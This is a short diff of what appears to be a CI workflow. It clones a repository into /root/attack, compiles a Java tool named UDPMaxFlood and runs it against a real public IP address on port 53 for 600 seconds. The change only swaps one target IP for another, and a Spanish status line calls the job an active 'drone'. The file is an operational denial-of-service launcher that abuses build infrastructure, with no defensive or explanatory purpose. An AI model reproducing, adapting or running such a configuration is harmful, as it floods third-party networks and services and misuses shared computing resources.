@@ -24,7 +24,7 @@ jobs:
             "git clone https://github.com/feloxgarcia0-stack/UDP2.git /root/attack && \
              cd /root/attack && \
              javac UDPMaxFlood.java && \
-             java UDPMaxFlood 216.66.66.38 53 1472 8 600"
+             java UDPMaxFlood 65.56.110.92 53 1472 8 600"
 
           echo "### Misión en curso. El dron está activo."
       
